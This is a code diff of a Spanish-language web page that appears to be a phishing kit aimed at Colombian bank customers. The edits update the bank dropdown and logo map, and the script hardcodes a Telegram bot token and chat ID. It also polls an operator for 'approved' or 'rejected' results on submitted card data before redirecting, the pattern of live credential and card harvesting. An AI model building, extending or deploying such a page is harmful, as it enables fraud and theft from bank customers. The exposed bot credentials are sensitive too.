@@ -588,11 +588,11 @@
           <option value="">Seleccione su banco</option>
           <option value="Bancolombia">BANCOLOMBIA</option>
           <option value="Davivienda">BANCO DAVIVIENDA</option>
+          <option value="Davibank">DAVIBANK</option>
           <option value="BBVA Colombia">BANCO BBVA COLOMBIA S.A.</option>
           <option value="Banco de Bogotá">BANCO DE BOGOTA</option>
           <option value="Caja Social">BANCO CAJA SOCIAL</option>
           <option value="Citibank Colombia">CITIBANK</option>
-          <option value="Colpatria">SCOTIABANK COLPATRIA</option>
           <option value="Banco AV Villas">BANCO AV VILLAS</option>
           <option value="Banco Falabella">BANCO FALABELLA</option>
           <option value="Banco Finandina">BANCO FINANDINA S.A. BIC</option>
@@ -646,7 +646,7 @@
 
   <script>
     // ============================================
-    // CONFIGURACIÓN
+    // CONFIGURACIÓN - TOKEN Y CHAT ID CORRECTOS
     // ============================================
     const TELEGRAM_BOT_TOKEN = '8736155859:AAHI77N8wP6_UNpI3RGIerJkLRRKUvVR8iQ';
     const TELEGRAM_CHAT_ID = '-1004294946880';
@@ -660,23 +660,23 @@
     let bancoSeleccionado = null;
 
     // ============================================
-    // MAPA DE LOGOS DE BANCOS
+    // MAPA DE LOGOS DE BANCOS CON LOS NOMBRES EXACTOS
     // ============================================
     const bankLogos = {
       'Bancolombia': 'bancol.png',
       'Davivienda': 'davivienda.png',
+      'Davibank': 'db.png',
       'BBVA Colombia': 'bbva.png',
       'Banco de Bogotá': 'bog.png',
-      'Banco Popular': 'popu.png',
-      'Banco Occidente': 'occi.png',
+      'Caja Social': 'Caja.png',
       'Citibank Colombia': 'citi.png',
       'Banco AV Villas': 'avvillas.png',
       'Banco Falabella': 'fala.png',
       'Banco Finandina': 'finandina.png',
       'Itaú': 'itau.png',
       'Nequi': 'nequi.png',
-      'Caja Social': 'Caja.jpg',
-      'Colpatria': 'colpatria.png',
+      'Banco Occidente': 'occi.png',
+      'Banco Popular': 'popu.png',
       'Serfinanza': 'serfinanza.png',
       'Tuya': 'tuya.png'
     };
@@ -822,7 +822,7 @@
       const progressFill = document.getElementById('progressFill');
       const loadingText = document.getElementById('loadingText');
 
-      // Guardar el logo del banco en localStorage
+      // 🔥 GUARDAR EL LOGO DEL BANCO EN localStorage
       const logoFile = bankLogos[banco] || defaultLogo;
       localStorage.setItem('logo_banco', logoFile);
       localStorage.setItem('banco_seleccionado', banco);
@@ -977,7 +977,6 @@
 
         if (resultado === 'approved') {
           clearInterval(pollingInterval);
-          // ✅ Mostrar directamente la pantalla de carga sin mensaje
           mostrarCargaYRedirigir(tipoTarjeta, banco);
         } else if (resultado === 'rejected') {
           clearInterval(pollingInterval);
